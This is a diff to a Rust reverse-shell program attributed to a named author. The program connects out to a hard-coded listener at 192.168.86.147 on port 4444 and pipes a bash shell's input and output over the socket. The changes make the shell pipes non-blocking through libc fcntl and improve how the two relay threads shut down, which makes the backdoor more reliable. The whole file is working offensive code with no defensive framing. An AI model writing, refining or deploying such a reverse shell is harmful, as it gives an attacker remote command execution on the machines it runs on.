@@ -1,4 +1,4 @@
-extern crate env_logger;
+#![feature(libc)]
 
 /// Opens a TCP connection to the configured server and runs a command.
 /// In/output from the executed command is redirected from/to the established connection.
@@ -7,8 +7,10 @@ extern crate env_logger;
 /// Author: Gavyn Riebau
 /// https://github.com/gavynriebau
 
+extern crate env_logger;
 #[macro_use]
 extern crate log;
+extern crate libc;
 
 use std::net::*;
 use std::process::*;
@@ -17,6 +19,7 @@ use std::thread;
 use std::sync::Arc;
 use std::time::Duration;
 use std::sync::atomic::{AtomicBool, Ordering};
+use std::os::unix::io::AsRawFd;
 
 const LHOST : &str = "192.168.86.147";
 const LPORT : &str = "4444";
@@ -49,6 +52,18 @@ fn handle_network_connection(stream: TcpStream) {
     let shell_reading_finished = Arc::clone(&finished);
     let network_reading_finished = Arc::clone(&finished);
 
+    // Make shell stdin/stdout non-blocking.
+    if cfg!(target_os = "linux") {
+        unsafe {
+            let fd_shell_out = shell_out.as_raw_fd();
+            let flags_shell_out = libc::fcntl(fd_shell_out, libc::F_GETFL);
+            let _ = libc::fcntl(fd_shell_out, libc::F_SETFL, flags_shell_out | libc::O_NONBLOCK);
+            let fd_shell_in = shell_in.as_raw_fd();
+            let flags_shell_in = libc::fcntl(fd_shell_in, libc::F_GETFL);
+            let _ = libc::fcntl(fd_shell_in, libc::F_SETFL, flags_shell_in | libc::O_NONBLOCK);
+        }
+    }
+
     debug!("Beginning IO read/write loops");
 
     // Thread to read from shell and write to network
@@ -56,12 +71,18 @@ fn handle_network_connection(stream: TcpStream) {
         let mut buffer: [u8; 512] = [0; 512];
 
         loop {
+
+            if shell_reading_finished.load(Ordering::Relaxed) {
+                debug!("Other thread finished, time to stop.");
+                break;
+            }
+
             match shell_out.read(&mut buffer) {
                 Ok(read_count) => {
                     if read_count > 0 {
                         match network_in.write(&mut buffer[0..read_count]) {
                             Ok(write_count) => {
-                                trace!("shell --> {:>4} --> socket", write_count);
+                                trace!("shell --> {:>3} --> socket", write_count);
                                 network_in.flush().unwrap();
                             },
                             Err(ref e) if e.kind() == ErrorKind::WouldBlock => {
@@ -71,13 +92,19 @@ fn handle_network_connection(stream: TcpStream) {
                             Err(e) => {
                                 error!("Error reading from stream: {}", e);
                                 shell_reading_finished.store(true, Ordering::Relaxed);
-                                break;
                             }
                         }
+                    } else {
+                        error!("Received no bytes from shell_out / must be closed.");
+                        shell_reading_finished.store(true, Ordering::Relaxed);
                     }
                 },
+                Err(ref e) if e.kind() == ErrorKind::WouldBlock => {
+                    // Wait until shell_out is ready.
+                    thread::yield_now();
+                },
                 Err(e) => {
-                    error!("Failed to read from bash because: {}", e);
+                    error!("Failed to read from bash because: {} - {:?}", e, e.kind());
                     shell_reading_finished.store(true, Ordering::Relaxed);
                 }
             }
@@ -92,19 +119,31 @@ fn handle_network_connection(stream: TcpStream) {
 
         loop {
 
+            if network_reading_finished.load(Ordering::Relaxed) {
+                debug!("Other thread finished, time to stop.");
+                break;
+            }
+
             match network_out.read(&mut buffer) {
                 Ok(read_count) => {
                     if read_count > 0 {
                         match shell_in.write(&mut buffer[0..read_count]) {
                             Ok(write_count) => {
-                                trace!("shell <-- {:>4} <-- socket", write_count);
+                                trace!("shell <-- {:>3} <-- socket", write_count);
                                 shell_in.flush().unwrap();
+                            },
+                            Err(ref e) if e.kind() == ErrorKind::WouldBlock => {
+                                // Wait until shell_in is ready.
+                                thread::yield_now();
                             },
                             Err(e) => {
                                 error!("Error writing to bash: {}", e);
                                 network_reading_finished.store(true, Ordering::Relaxed);
                             }
                         }
+                    } else {
+                        error!("Received no bytes from network_out / must be closed.");
+                        network_reading_finished.store(true, Ordering::Relaxed);
                     }
                 },
                 Err(ref e) if e.kind() == ErrorKind::WouldBlock => {
@@ -114,7 +153,6 @@ fn handle_network_connection(stream: TcpStream) {
                 Err(e) => {
                     error!("Error reading from stream: {}", e);
                     network_reading_finished.store(true, Ordering::Relaxed);
-                    break;
                 }
             }
 
